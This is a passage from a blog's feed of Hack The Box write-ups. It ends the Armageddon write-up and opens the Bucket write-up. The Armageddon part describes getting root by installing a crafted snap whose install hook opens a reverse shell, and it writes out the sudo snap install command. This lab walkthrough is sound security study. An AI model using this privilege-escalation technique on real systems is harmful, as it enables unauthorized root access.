+&lt;p&gt;:warning: &lt;em&gt;At first, the error “/snap/revsh/x1/meta/hooks/install: Syntax error: Bad fd number)” was being thrown around. This is probably because the command was being executed with sh and not bash. Reworking the payload a bit to specify bash and its command argument did the trick.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Downloading the payload and executing it: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo snap install rev1_1.0_all.snap --dangerous --devmode&lt;/code&gt; while having a listener on our host gives us &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210509233316.png&quot; alt=&quot;Pasted image 20210509233316&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we are able to get the &lt;strong&gt;root.txt&lt;/strong&gt; flag :black_flag:.&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html">Write up for the easy-rated HTB box Armageddon, completed on May 9th 2021. Fairly straightforward machine if you know where to look; 80% of the time spent here was on trying to do “optional” steps.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/4256f259c8ac66a3eda11206371eaf8b.png" /><media:content medium="image" url="/assets/images/4256f259c8ac66a3eda11206371eaf8b.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HTB Writeup - Bucket</title><link href="/posts/HTB-Writeup-Bucket" rel="alternate" type="text/html" title="HTB Writeup - Bucket" /><published>2021-04-25T13:40:00+02:00</published><updated>2021-04-25T13:40:00+02:00</updated><id>/posts/HTB-Writeup:-Bucket</id><content type="html" xml:base="/posts/HTB-Writeup-Bucket">&lt;p&gt;&lt;img src=&quot;/assets/images/3f07dd46f3ff7d287d2f736b18c6ded7.png&quot; alt=&quot;3f07dd46f3ff7d287d2f736b18c6ded7&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This my write-up for Bucket, a medium-difficulty Linux box completed on April 25th 2021, with acclaim from the community I should say; as it included technologies not often found in typical CTF, or so I cam e to understand.&lt;/p&gt;
 
